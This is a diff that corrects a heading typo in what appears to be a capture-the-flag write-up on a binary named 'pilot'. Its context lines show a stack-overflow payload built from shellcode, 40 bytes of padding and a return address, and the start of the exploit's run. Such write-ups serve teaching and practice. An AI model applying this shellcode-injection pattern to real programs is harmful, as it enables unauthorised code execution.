@@ -29,7 +29,7 @@ The input starts writing to `Stack[-0x28]` which is int `40`, so the exploit wil
 payload = shell_please + b'A' * (40-len(shell_please)) + p64(int(address, 16))
 ```
 
-## Soltuion 
+## Solution 
 ```
 $ python3 ex_pilot.py 
 [+] Starting local process './pilot': pid 15039
